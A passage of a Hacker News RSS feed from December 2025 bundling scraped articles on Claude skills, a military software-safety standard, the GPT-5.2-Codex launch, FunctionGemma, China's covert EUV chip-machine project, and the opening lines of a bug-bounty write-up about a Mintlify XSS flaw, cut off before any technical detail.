    &lt;p&gt;Claude Team and Enterprise plan admins can now provision skills centrally from admin settings. Admin-provisioned skills are enabled by default for all users. Users can still toggle individual skills off if they choose. This gives organizations consistent, approved workflows across teams while letting individual users customize their experience.&lt;/p&gt;
    &lt;head rend="h2"&gt;Discover, create, and edit new skills&lt;/head&gt;
    &lt;p&gt;Creating skills is now simpler. Describe what you want and Claude helps build it, or write instructions directly. For complex workflows, upload skill folders or use the skill-creator. Claude can also help you edit existing skills, and new previews show full contents so you can understand exactly what a skill does before enabling it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Skills directory&lt;/head&gt;
    &lt;p&gt;A growing collection of partner-built skills is now available at claude.com/connectors.&lt;/p&gt;
    &lt;p&gt;Admins can provision these partner skills across their organization, giving teams immediate access to workflows for tools they already use without any custom development.&lt;/p&gt;
    &lt;head rend="h2"&gt;An open standard&lt;/head&gt;
    &lt;p&gt;We're also publishingÂ Agent Skills as an open standard. Like MCP, we believe skills should be portable across tools and platformsâthe same skill should work whether you're using Claude or other AI platforms. We've been collaborating with members of the ecosystem, and we're excited to see early adoption of the standard.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting started&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Claude Apps: Browse the skills directory and enable in Settings &amp;gt; Capabilities &amp;gt; Skills.&lt;/item&gt;
      &lt;item&gt;Claude Code: Install from the plugin directory or check skills into your repository.&lt;/item&gt;
      &lt;item&gt;Claude Developer Platform (API): Use skills via the /v1/skills endpoint. See documentation.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Admins can provision skills org-wide through Admin Settings. Skills require Code Execution and File Creation to be enabled.&lt;/p&gt;
    &lt;head rend="h2"&gt;Transform how your organization operates with Claude&lt;/head&gt;
    &lt;p&gt;Get the developer newsletter&lt;/p&gt;
    &lt;p&gt;Product updates, how-tos, community spotlights, and more. Delivered monthly to your inbox.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46315414</guid><pubDate>Thu, 18 Dec 2025 17:04:32 +0000</pubDate></item><item><title>Military standard on software control levels</title><link>https://entropicthoughts.com/mil-std-882e-software-control</link><description>&lt;doc fingerprint="cd5f5d5cca4f29dc"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Military Standard on Software Control Levels&lt;/head&gt;
    &lt;p&gt;The mil-std-882e standard specifies levels of software control, i.e. how dangerous the software can be based on what it is responsible for. Although the standard is a little more complicated, we can simplify to essentially four levels:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The most alarming case is when the software has direct control of something that can be immediately dangerous if the software does the wrong thing.&lt;/item&gt;
      &lt;item&gt;Still dangerous, but slightly less so is either (a) when the software has direct control, but there is a delay between when it does the wrong thing and when it becomes dangerous; or (b) when the software is not directly in control, but a human must immediately react to software signals and perform an action to prevent danger.1 E.g. the software commands a reactor shutdown when there are only seconds remaining until the reactor blows up.&lt;/item&gt;
      &lt;item&gt;Yet less dangerous is when the software is not in direct control, and there is time to verify its suggestion against independent methods to make sure the action recommended by the software is indeed appropriate.&lt;/item&gt;
      &lt;item&gt;The least dangerous is when software only has an auxiliary use and is not involved in controlling something serious.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I thought this was a neat way to look at things, and particularly salient now that llms and computer vision have blown open new opportunities for injecting software into processes in which software were previously subservient to humans.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46315547</guid><pubDate>Thu, 18 Dec 2025 17:12:46 +0000</pubDate></item><item><title>GPT-5.2-Codex</title><link>https://openai.com/index/introducing-gpt-5-2-codex/</link><description>&lt;doc fingerprint="3f4b6dffd47fc68d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Introducing GPT-5.2-Codex&lt;/head&gt;
    &lt;p&gt;The most advanced agentic coding model for professional software engineering and defensive cybersecurity.&lt;/p&gt;
    &lt;p&gt;Today we’re releasing GPT‑5.2-Codex, the most advanced agentic coding model yet for complex, real-world software engineering. GPT‑5.2-Codex is a version of GPT‑5.2 further optimized for agentic coding in Codex, including improvements on long-horizon work through context compaction, stronger performance on large code changes like refactors and migrations, improved performance in Windows environments, and significantly stronger cybersecurity capabilities.&lt;/p&gt;
    &lt;p&gt;As our models continue to advance along the intelligence frontier, we’ve observed that these improvements also translate to capability jumps in specialized domains such as cybersecurity. For example, just last week, a security researcher using GPT‑5.1-Codex-Max with Codex CLI found and responsibly disclosed(opens in a new window) a vulnerability in React that could lead to source code exposure.&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex has stronger cybersecurity capabilities than any model we’ve released so far. These advances can help strengthen cybersecurity at scale, but they also raise new dual-use risks that require careful deployment. While GPT‑5.2-Codex does not reach a ‘High’ level of cyber capability under our Preparedness Framework, we’re designing our deployment approach with future capability growth in mind.&lt;/p&gt;
    &lt;p&gt;We're releasing GPT‑5.2-Codex today in all Codex surfaces for paid ChatGPT users, and working towards safely enabling access to GPT‑5.2-Codex for API users in the coming weeks. In parallel, we’re piloting invite-only trusted access to upcoming capabilities and more permissive models for vetted professionals and organizations focused on defensive cybersecurity work. We believe that this approach to deployment will balance accessibility with safety.&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex builds on GPT‑5.2’s strengths in professional knowledge work and GPT‑5.1-Codex-Max’s frontier agentic coding and terminal-using capabilities. GPT‑5.2-Codex is now better at long-context understanding, reliable tool calling, improved factuality, and native compaction, making it a more dependable partner for long running coding tasks, while remaining token-efficient in its reasoning.&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex achieves state-of-the-art performance on SWE-Bench Pro and Terminal-Bench 2.0, benchmarks designed to test agentic performance on a wide variety of tasks in realistic terminal environments. It is also much more effective and reliable at agentic coding in native Windows environments, building on capabilities introduced in GPT‑5.1-Codex-Max.&lt;/p&gt;
    &lt;p&gt;With these improvements, Codex is more capable at working in large repositories over extended sessions with full context intact. It can more reliably complete complex tasks like large refactors, code migrations, and feature builds — continuing to iterate without losing track, even when plans change or attempts fail.&lt;/p&gt;
    &lt;p&gt;Stronger vision performance enables GPT‑5.2-Codex to more accurately interpret screenshots, technical diagrams, charts, and UI surfaces shared during coding sessions.&lt;/p&gt;
    &lt;p&gt;Codex can take design mocks and quickly translate them to functional prototypes, and you can pair with Codex to take these prototypes to production.&lt;/p&gt;
    &lt;head rend="h5"&gt;Design mock&lt;/head&gt;
    &lt;head rend="h5"&gt;Prototype generated by GPT-5.2-Codex&lt;/head&gt;
    &lt;p&gt;When charting performance on one of our core cybersecurity evaluations over time, we see a sharp jump in capability starting with GPT‑5-Codex, another large jump with GPT‑5.1-Codex-Max and now a third jump with GPT‑5.2-Codex. We expect that upcoming AI models will continue on this trajectory. In preparation, we are planning and evaluating as though each new model could reach ‘High’ levels of cybersecurity capability, as measured by our Preparedness Framework(opens in a new window). While GPT‑5.2-Codex has not yet reached ‘High’ level of cyber capability, we are preparing for future models that cross that threshold. Due to the increased cyber capabilities, we have added additional safeguards in the model and in the product, which are outlined in the system card.&lt;/p&gt;
    &lt;p&gt;Modern society runs on software, and its reliability depends on strong cybersecurity—keeping critical systems in banking, healthcare, communications, and essential services online, protecting sensitive data, and ensuring people can trust the software they rely on every day. Vulnerabilities can exist long before anyone knows about them, and finding, validating, and fixing them often depends on a community of engineers and independent security researchers equipped with the right tools.&lt;/p&gt;
    &lt;p&gt;On December 11, 2025, the React team published three security vulnerabilities affecting apps built with React Server Components. What made this disclosure notable was not only the vulnerabilities themselves, but how they were uncovered.&lt;/p&gt;
    &lt;p&gt;Andrew MacPherson, a principal security engineer at Privy (a Stripe company), was using GPT‑5.1-Codex-Max with Codex CLI and other coding agents to reproduce and study a different critical React vulnerability disclosed the week prior, known as React2Shell(opens in a new window) (CVE-2025-55182(opens in a new window)). His goal was to evaluate how well the model could assist with real-world vulnerability research.&lt;/p&gt;
    &lt;p&gt;He initially attempted several zero-shot analyses, prompting the model to examine the patch and identify the vulnerability it addressed. When that did not yield results, he shifted to a higher-volume, iterative prompting approach. When those approaches did not succeed, he guided Codex through standard defensive security workflows—setting up a local test environment, reasoning through potential attack surfaces, and using fuzzing to probe the system with malformed inputs. While attempting to reproduce the original React2Shell issue, Codex surfaced unexpected behaviors that warranted deeper investigation. Over the course of a single week, this process led to the discovery of previously unknown vulnerabilities, which were responsibly disclosed to the React team.&lt;/p&gt;
    &lt;p&gt;This demonstrates how advanced AI systems can materially accelerate defensive security work in widely used, real-world software. At the same time, capabilities that help defenders move faster can also be misused by bad actors.&lt;/p&gt;
    &lt;p&gt;As agentic systems become more capable in cybersecurity-relevant tasks, we are making it a core priority to ensure these advances are deployed responsibly—pairing every gain in capability with stronger safeguards, tighter access controls, and ongoing collaboration with the security community.&lt;/p&gt;
    &lt;p&gt;Security teams can run into restrictions when attempting to emulate threat actors, analyze malware to support remediation, or stress test critical infrastructure. We are developing a trusted access pilot to remove that friction for qualifying users and organizations and enable trusted defenders to use frontier AI cyber capabilities to accelerate cyberdefense.&lt;/p&gt;
    &lt;p&gt;Initially the pilot program will be invite-only for vetted security professionals with a track record of responsible vulnerability disclosure and organizations with a clear professional cybersecurity use case. Qualifying participants will get access to our most capable models for defensive use-cases to enable legitimate dual-use work.&lt;/p&gt;
    &lt;p&gt;If you’re a security professional or part of an organization doing ethical security work like vulnerability research or authorized red-teaming, we invite you to express interest in joining and share feedback on what you’d like to see from the program here(opens in a new window).&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex represents a step forward in how advanced AI can support real-world software engineering and specialized domains like cybersecurity—helping developers and defenders tackle complex, long-horizon work, and strengthening the tools available for responsible security research.&lt;/p&gt;
    &lt;p&gt;By rolling GPT‑5.2-Codex out gradually, pairing deployment with safeguards, and working closely with the security community, we’re aiming to maximize defensive impact while reducing the risk of misuse. What we learn from this release will directly inform how we expand access over time as the software and cyber frontiers continue to advance.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46316367</guid><pubDate>Thu, 18 Dec 2025 18:14:48 +0000</pubDate></item><item><title>Firefox will have an option to disable all AI features</title><link>https://mastodon.social/@firefoxwebdevs/115740500373677782</link><description>&lt;doc fingerprint="f8eb8f2f2d953eed"&gt;
  &lt;main&gt;
    &lt;p&gt;To use the Mastodon web application, please enable JavaScript. Alternatively, try one of the native apps for Mastodon for your platform.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46316409</guid><pubDate>Thu, 18 Dec 2025 18:18:30 +0000</pubDate></item><item><title>FunctionGemma 270M Model</title><link>https://blog.google/technology/developers/functiongemma/</link><description>&lt;doc fingerprint="9dd7ecd2c69883e3"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;FunctionGemma: Bringing bespoke function calling to the edge&lt;/head&gt;
    &lt;p&gt;It has been a transformative year for the Gemma family of models. In 2025, we have grown from 100 million to over 300 million downloads while demonstrating the transformative potential of open models, from defining state-of-the-art single-accelerator performance with Gemma 3 to advancing cancer research through the C2S Scale initiative.&lt;/p&gt;
    &lt;p&gt;Since launching the Gemma 3 270M model, the number one request we’ve received from developers is for native function calling capabilities. We listened, recognizing that as the industry shifts from purely conversational interfaces to active agents, models need to do more than just talk — they need to act. This is particularly compelling on-device, where agents can automate complex, multi-step workflows, from setting reminders to toggling system settings. To enable this at the edge, models must be lightweight enough to run locally and specialized enough to be reliable.&lt;/p&gt;
    &lt;p&gt;Today, we are releasing FunctionGemma, a specialized version of our Gemma 3 270M model tuned for function calling. It is designed as a strong base for further training into custom, fast, private, local agents that translate natural language into executable API actions.&lt;/p&gt;
    &lt;p&gt;FunctionGemma acts as a fully independent agent for private, offline tasks, or as an intelligent traffic controller for larger connected systems. In this role, it can handle common commands instantly at the edge, while routing more complex tasks to models like Gemma 3 27B.&lt;/p&gt;
    &lt;head rend="h3"&gt;What makes FunctionGemma unique&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Unified action and chat: FunctionGemma knows how to talk to both computers and humans. It can generate structured function calls to execute tools, then switch context to summarize the results in natural language for the user.&lt;/item&gt;
      &lt;item&gt;Built for customization: FunctionGemma is designed to be molded, not just prompted. In our "Mobile Actions" evaluation, fine-tuning transformed the model’s reliability, boosting accuracy from a 58% baseline to 85%. This confirms that for edge agents, a dedicated, trained specialist is an efficient path to production-grade performance.&lt;/item&gt;
      &lt;item&gt;Engineered for the edge: Small enough to run on edge devices like the NVIDIA Jetson Nano and mobile phones, the model uses Gemma’s 256k vocabulary to efficiently tokenize JSON and multilingual inputs. This makes it a strong base for fine-tuning in specific domains, reducing sequence length to ensure minimum latency and total user privacy.&lt;/item&gt;
      &lt;item&gt;Broad ecosystem support: The model is supported by popular tools across the entire workflow: fine-tune with Hugging Face Transformers, Unsloth, Keras or NVIDIA NeMo and deploy using LiteRT-LM, vLLM, MLX, Llama.cpp, Ollama, Vertex AI or LM Studio.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;FunctionGemma accuracy on Mobile Actions dataset before and after fine-tuning on a held out eval set.&lt;/p&gt;
    &lt;head rend="h2"&gt;When to choose FunctionGemma&lt;/head&gt;
    &lt;p&gt;FunctionGemma is the bridge between natural language and software execution. It is the right tool if:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;You have a defined API surface: Your application has a defined set of actions (e.g., smart home, media, navigation).&lt;/item&gt;
      &lt;item&gt;You are ready to fine-tune: You need the consistent, deterministic behavior that comes from fine-tuning on specific data, rather than the variability of zero-shot prompting.&lt;/item&gt;
      &lt;item&gt;You prioritize local-first deployment: Your application requires near-instant latency and total data privacy, running efficiently within the compute and battery limits of edge devices.&lt;/item&gt;
      &lt;item&gt;You are building compound systems: You need a lightweight edge model to handle local actions, allowing your system to process common commands on-device and only query larger models (like Gemma 3 27B) for more complex tasks.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;How to see it in action&lt;/head&gt;
    &lt;p&gt;Let's look at how these models transform actual user experiences. You can explore these capabilities in the Google AI Edge Gallery app through two distinct experiences: an interactive game and a developer challenge.&lt;/p&gt;
    &lt;head rend="h3"&gt;Mobile Actions fine tuning&lt;/head&gt;
    &lt;p&gt;This demo reimagines assistant interaction as a fully offline capability. Whether it’s "Create a calendar event for lunch tomorrow," "Add John to my contacts" or "Turn on the flashlight," the model parses the natural language and identifies the correct OS tool to execute the command. To unlock this agent, developers are invited to use our fine-tuning cookbook to build the model and load it onto their mobile device.&lt;/p&gt;
    &lt;head rend="h3"&gt;TinyGarden game demo&lt;/head&gt;
    &lt;p&gt;In this interactive mini-game, players use voice commands to manage a virtual plot of land. You might say, "Plant sunflowers in the top row and water them," and the model decomposes this into specific app functions like plantCrop or waterCrop targeting specific grid coordinates. This proves that a 270M model can handle multi-turn logic to drive custom game mechanics, on a mobile phone, without ever pinging a server.&lt;/p&gt;
    &lt;head rend="h3"&gt;FunctionGemma Physics Playground&lt;/head&gt;
    &lt;p&gt;Use natural language to solve fun physics simulation puzzles in a game that runs 100% locally in your browser, powered by FunctionGemma and Transformers.js!&lt;/p&gt;
    &lt;p&gt;Credit: @xenovacom on X&lt;/p&gt;
    &lt;head rend="h2"&gt;How to try FunctionGemma today&lt;/head&gt;
    &lt;p&gt;We are moving from an era of chatbots to an era of action. With FunctionGemma, that power now fits in your pocket.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Download: Get the model on Hugging Face or Kaggle.&lt;/item&gt;
      &lt;item&gt;Learn: Check out the guides on function calling templates, how to sequence the model with function responses and fine-tuning.&lt;/item&gt;
      &lt;item&gt;Explore: Download the updated Google AI Edge Gallery to try the demos.&lt;/item&gt;
      &lt;item&gt;Build: Access the Mobile Actions guide with a Colab notebook and dataset to train your own specialized agent.&lt;/item&gt;
      &lt;item&gt;Deploy: Easily publish your own models onto mobile devices using LiteRT-LM or use alongside larger models on Vertex AI or NVIDIA devices like RTX PRO and DGX Spark.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We can’t wait to see the unique, private, and ultra-fast experiences you unlock on-device.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46316533</guid><pubDate>Thu, 18 Dec 2025 18:26:52 +0000</pubDate></item><item><title>How China built its ‘Manhattan Project’ to rival the West in AI chips</title><link>https://www.japantimes.co.jp/business/2025/12/18/tech/china-west-ai-chips/</link><description>&lt;doc fingerprint="6dd0d11d2f83dba9"&gt;
  &lt;main&gt;
    &lt;p&gt;In a high-security Shenzhen laboratory, Chinese scientists have built what Washington has spent years trying to prevent: a prototype of a machine capable of producing the cutting-edge semiconductor chips that power artificial intelligence, smartphones and weapons central to Western military dominance.&lt;/p&gt;
    &lt;p&gt;Completed in early 2025 and now undergoing testing, the prototype fills nearly an entire factory floor. It was built by a team of former engineers from Dutch semiconductor giant ASML who reverse-engineered the company’s extreme ultraviolet lithography machines (EUVs), according to two people with knowledge of the project.&lt;/p&gt;
    &lt;p&gt;EUV machines sit at the heart of a technological Cold War. They use beams of extreme ultraviolet light to etch circuits thousands of times thinner than a human hair onto silicon wafers, currently a capability monopolized by the West. The smaller the circuits, the more powerful the chips.&lt;/p&gt;
    &lt;p&gt;China’s machine is operational and successfully generating extreme ultraviolet light, but has not yet produced working chips, the people said.&lt;/p&gt;
    &lt;p&gt;In April, ASML CEO Christophe Fouquet said that China would need “many, many years” to develop such technology. But the existence of this prototype, which is being reported for the first time, suggests China may be years closer to achieving semiconductor independence than analysts anticipated.&lt;/p&gt;
    &lt;p&gt;Nevertheless, China still faces major technical challenges, particularly in replicating the precision optical systems that Western suppliers produce.&lt;/p&gt;
    &lt;p&gt;The availability of parts from older ASML machines on secondary markets has allowed China to build a domestic prototype, with the government setting a goal of producing working chips on the prototype by 2028, according to the two people.&lt;/p&gt;
    &lt;p&gt;But those close to the project say a more realistic target is 2030, which is still years earlier than the decade that analysts believed it would take China to match the West on chips.&lt;/p&gt;
    &lt;p&gt;Chinese authorities did not respond to requests for comment.&lt;/p&gt;
    &lt;p&gt;The breakthrough marks the culmination of a six-year government initiative to achieve semiconductor self-sufficiency, one of President Xi Jinping’s highest priorities. While China’s semiconductor goals have been public, the Shenzhen EUV project has been conducted in secret, according to the people.&lt;/p&gt;
    &lt;p&gt;The project falls under the country’s semiconductor strategy, which state media has identified as being run by Xi confidant Ding Xuexiang, who heads the Communist Party’s Central Science and Technology Commission.&lt;/p&gt;
    &lt;p&gt;Chinese electronics giant Huawei plays a key role coordinating a web of companies and state research institutes across the country involving thousands of engineers, according to the two people and a third source.&lt;/p&gt;
    &lt;p&gt;The people described it as China’s version of the Manhattan Project, the U.S. wartime effort to develop the atomic bomb.&lt;/p&gt;
    &lt;p&gt;“The aim is for China to eventually be able to make advanced chips on machines that are entirely China-made,” one of the people said.&lt;/p&gt;
    &lt;p&gt;China wants the United States 100% kicked out of its supply chains.”&lt;/p&gt;
    &lt;p&gt;Huawei, the State Council of China, the Chinese Embassy in Washington, and China’s Ministry of Industry and Information Technology did not respond to requests for comment.&lt;/p&gt;
    &lt;p&gt;Until now, only one company has mastered EUV technology: ASML, headquartered in Veldhoven, Netherlands. Its machines, which cost around $250 million, are indispensable for manufacturing the most advanced chips designed by companies such as Nvidia and AMD, and produced by chipmakers such as Taiwan Semiconductor Manufacturing Co., Intel and Samsung.&lt;/p&gt;
    &lt;p&gt;ASML built its first working prototype of EUV technology in 2001, and said it took nearly two decades and billions of euros in research and development spending before it produced its first commercially available chips in 2019.&lt;/p&gt;
    &lt;p&gt;“It makes sense that companies would want to replicate our technology, but doing so is no small feat,” ASML said in a statement.&lt;/p&gt;
    &lt;p&gt;ASML’s EUV systems are currently available to U.S. allies including Taiwan, South Korea and Japan.&lt;/p&gt;
    &lt;p&gt;Starting in 2018, the United States began pressuring the Netherlands to block ASML from selling EUV systems to China. The restrictions expanded in 2022, when the administration of then-President Joe Biden imposed sweeping export controls designed to cut off China’s access to advanced semiconductor technology.&lt;/p&gt;
    &lt;p&gt;The controls targeted not just EUV systems but also older deep ultraviolet (DUV) lithography machines that produce less-advanced chips such as Huawei’s, with the aim of keeping China at least a generation behind in chipmaking capabilities.&lt;/p&gt;
    &lt;p&gt;The U.S. State Department said the administration of U.S. President Donald Trump has strengthened enforcement of export controls on advanced semiconductor manufacturing equipment and is working with partners “to close loopholes as technology advances.”&lt;/p&gt;
    &lt;p&gt;The Dutch Ministry of Defense said the Netherlands is developing policies requiring “knowledge institutions” to perform personnel screenings to prevent access to sensitive technology “by individuals that have ill intentions or who are at risk of being pressured.”&lt;/p&gt;
    &lt;p&gt;Export restrictions have slowed China’s progress toward semiconductor self-sufficiency for years, and constrained advanced chip production at Huawei, the two people and a third person said.&lt;/p&gt;
    &lt;p&gt;The sources spoke on condition they not be identified due to the confidentiality of the project.&lt;/p&gt;
    &lt;head rend="h3"&gt;China’s Manhattan Project&lt;/head&gt;
    &lt;p&gt;One veteran Chinese engineer from ASML recruited to the project was surprised to find that his generous signing bonus came with an identification card issued under a false name, according to one of the people, who was familiar with his recruitment.&lt;/p&gt;
    &lt;p&gt;Once inside, he recognized other former ASML colleagues who were also working under aliases and was instructed to use their fake names at work to maintain secrecy, the person said. Another person independently confirmed that recruits were given fake IDs to conceal their identities from other workers inside the secure facility.&lt;/p&gt;
    &lt;p&gt;The guidance was clear, the two people said: Classified under national security, no one outside the compound could know what they were building — or that they were there at all.&lt;/p&gt;
    &lt;p&gt;The team includes recently retired, Chinese-born former ASML engineers and scientists — prime recruitment targets because they possess sensitive technical knowledge but face fewer professional constraints after leaving the company, the people said.&lt;/p&gt;
    &lt;p&gt;Two current ASML employees of Chinese nationality in the Netherlands said they have been approached by recruiters from Huawei since at least 2020.&lt;/p&gt;
    &lt;p&gt;Huawei did not respond to requests for comment.&lt;/p&gt;
    &lt;p&gt;European privacy laws limit ASML’s ability to track former employees. Though employees sign non-disclosure agreements, enforcing them across borders has proven difficult.&lt;/p&gt;
    &lt;p&gt;ASML won an $845 million judgment in 2019 against a former Chinese engineer accused of stealing trade secrets, but the defendant filed for bankruptcy and continues to operate in Beijing with Chinese government support, according to court documents.&lt;/p&gt;
    &lt;p&gt;ASML said that it “vigilantly guards” trade secrets and confidential information.&lt;/p&gt;
    &lt;p&gt;“While ASML cannot control or restrict where former employees work, all employees are bound by the confidentiality clauses in their contracts,” the company said, and it has “successfully pursued legal action in response to the theft of trade secrets.”&lt;/p&gt;
    &lt;p&gt;It could not be determined if any legal actions have been taken against former ASML employees involved in China’s lithography program.&lt;/p&gt;
    &lt;p&gt;The company said it safeguards EUV knowledge by ensuring only select employees can access the information even inside the company.&lt;/p&gt;
    &lt;p&gt;Dutch intelligence warned in an April report that China “used extensive espionage programmes in its attempts to obtain advanced technology and knowledge from Western countries,” including recruiting “Western scientists and employees of high-tech companies.”&lt;/p&gt;
    &lt;p&gt;The ASML veterans made the breakthrough in Shenzhen possible, the people said. Without their intimate knowledge of the technology, reverse-engineering the machines would have been nearly impossible.&lt;/p&gt;
    &lt;p&gt;Their recruitment was part of an aggressive drive China launched in 2019 for semiconductor experts working abroad, offering signing bonuses that started at 3 million yuan to 5 million yuan ($420,000 to $700,000) and home-purchase subsidies, according to a review of government policy documents.&lt;/p&gt;
    &lt;p&gt;Recruits included Lin Nan, ASML’s former head of light source technology, whose team at the Chinese Academy of Sciences’ Shanghai Institute of Optics has filed eight patents on EUV light sources in 18 months, according to patent filings.&lt;/p&gt;
    &lt;p&gt;The Shanghai Institute of Optics and Fine Mechanics did not respond to requests for comment. Lin could not be reached for comment.&lt;/p&gt;
    &lt;p&gt;Two additional people familiar with China’s recruitment efforts said some naturalized citizens of other countries were given Chinese passports and allowed to maintain dual citizenship.&lt;/p&gt;
    &lt;p&gt;China officially prohibits dual citizenship and did not answer questions on issuing passports.&lt;/p&gt;
    &lt;p&gt;Chinese authorities did not respond to requests for comment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Inside China’s EUV fab&lt;/head&gt;
    &lt;p&gt;ASML’s most advanced EUV systems are roughly the size of a school bus, and weigh 180 tons. After failed attempts to replicate its size, the prototype inside the Shenzhen lab became many times larger to improve its power, according to the two people.&lt;/p&gt;
    &lt;p&gt;The Chinese prototype is crude compared to ASML’s machines but operational enough for testing, the people said.&lt;/p&gt;
    &lt;p&gt;China’s prototype lags behind ASML’s machines largely because researchers have struggled to obtain optical systems such as those from Germany’s Carl Zeiss, one of ASML’s key suppliers, the two people said.&lt;/p&gt;
    &lt;p&gt;Zeiss declined to comment.&lt;/p&gt;
    &lt;p&gt;The machines fire lasers at molten tin 50,000 times per second, generating plasma at 200,000 degrees Celsius. The light is focused using mirrors that take months to produce, according to Zeiss’ website.&lt;/p&gt;
    &lt;p&gt;China’s top research institutes have played key roles in developing homegrown alternatives, according to the two people.&lt;/p&gt;
    &lt;p&gt;The Changchun Institute of Optics, Fine Mechanics and Physics at the Chinese Academy of Sciences (CIOMP) achieved a breakthrough in integrating extreme-ultraviolet light into the prototype’s optical system, enabling it to become operational in early 2025, one of the people said, though the optics still require significant refinement.&lt;/p&gt;
    &lt;p&gt;CIOMP did not respond to requests for comment.&lt;/p&gt;
    &lt;p&gt;In a March online recruitment call on its website, the institute said it was offering “uncapped” salaries to PhD lithography researchers and research grants worth up to 4 million yuan, plus 1 million yuan in personal subsidies.&lt;/p&gt;
    &lt;p&gt;Jeff Koch, an analyst at research firm SemiAnalysis and a former ASML engineer, said China will have achieved “meaningful progress” if the “light source has enough power, is reliable, and doesn’t generate too much contamination.”&lt;/p&gt;
    &lt;p&gt;“No doubt this is technically feasible, it’s just a question of timeline,” he said. “China has the advantage that commercial EUV now exists, so they aren’t starting from zero.”&lt;/p&gt;
    &lt;p&gt;To get the required parts, China is salvaging components from older ASML machines and sourcing parts from ASML suppliers through secondhand markets, the two people said.&lt;/p&gt;
    &lt;p&gt;Networks of intermediary companies are sometimes used to mask the ultimate buyer, the people said.&lt;/p&gt;
    &lt;p&gt;Export-restricted components from Japan’s Nikon and Canon are being used for the prototype, one of the people and an additional source said. Nikon declined to comment. Canon said it was not aware of such reports. The Japanese Embassy in Washington did not respond to a request for comment.&lt;/p&gt;
    &lt;p&gt;International banks regularly auction older semiconductor fabrication equipment, the sources said.&lt;/p&gt;
    &lt;p&gt;Auctions in China sold older ASML lithography equipment as recently as October 2025, according to a review of listings on Alibaba Auction, an Alibaba-owned platform.&lt;/p&gt;
    &lt;p&gt;A team of around 100 recent university graduates is focused on reverse-engineering components from both EUV and DUV lithography machines, according to the people.&lt;/p&gt;
    &lt;p&gt;Each worker’s desk is filmed by an individual camera to document their efforts to disassemble and reassemble parts — work the people described as key to China’s lithography efforts.&lt;/p&gt;
    &lt;p&gt;Staffers who successfully reassemble a component receive bonuses, the people said.&lt;/p&gt;
    &lt;head rend="h3"&gt;Huawei scientists sleep on site&lt;/head&gt;
    &lt;p&gt;While the EUV project is run by the Chinese government, Huawei is involved in every step of the supply chain from chip design and fabrication equipment to manufacturing and final integration into products like smartphones, according to four people familiar with Huawei’s operations.&lt;/p&gt;
    &lt;p&gt;CEO Ren Zhengfei briefs senior Chinese leaders on progress, according to one of the people.&lt;/p&gt;
    &lt;p&gt;The U.S. placed Huawei on an entity list in 2019, banning American companies from doing business with them without a license.&lt;/p&gt;
    &lt;p&gt;Huawei has deployed employees to offices, fabrication plants, and research centers across the country for the effort. Employees assigned to semiconductor teams often sleep on-site and are barred from returning home during the work week, with phone access restricted for teams handling more sensitive tasks, according to the people.&lt;/p&gt;
    &lt;p&gt;Inside Huawei, few employees know the scope of this work. “The teams are kept isolated from each other to protect the confidentiality of the project,” one of the people said.&lt;/p&gt;
    &lt;p&gt;“They don’t know what the other teams work on.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46316907</guid><pubDate>Thu, 18 Dec 2025 18:55:34 +0000</pubDate></item><item><title>We pwned X, Vercel, Cursor, and Discord through a supply-chain attack</title><link>https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28</link><description>&lt;doc fingerprint="b4b0b02b285796c6"&gt;
  &lt;main&gt;
    &lt;p&gt;hi, i'm daniel. i'm a 16-year-old high school senior. in my free time, i hack billion dollar companies and build cool stuff.&lt;/p&gt;
    &lt;p&gt;about a month ago, a couple of friends and I found serious critical vulnerabilities on Mintlify, an AI documentation platform used by some of the top companies in the world.&lt;/p&gt;
    &lt;p&gt;i found a critical cross-site scripting vulnerability that, if abused, would let an attacker to inject malicious scripts into the documentation of numerous companies and steal credentials from users with a single link open.&lt;/p&gt;
    &lt;p&gt;(go read my friends' writeups (after this one)) &lt;lb/&gt; how to hack discord, vercel, and more with one easy trick (eva) &lt;lb/&gt; Redacted by Counsel: A supply chain postmortem (MDL)&lt;/p&gt;
    &lt;p&gt;here's my story...&lt;/p&gt;
    &lt;p&gt;My story begins on Friday, November 7, 2025, when Discord announced a brand new update to their developer documentation platform. They were previously using a custom built documentation platform, but were switching to an AI-powered documentation platform.&lt;/p&gt;
    &lt;p&gt;Discord is one of my favorite places to hunt for vulnerabilities since I'm very familiar with their API and platform. I'm at the top of their bug bounty leaderboard having reported nearly 100 vulnerabilities over the last few years. After you've gone through every feature at least 10 times, it gets boring.&lt;/p&gt;
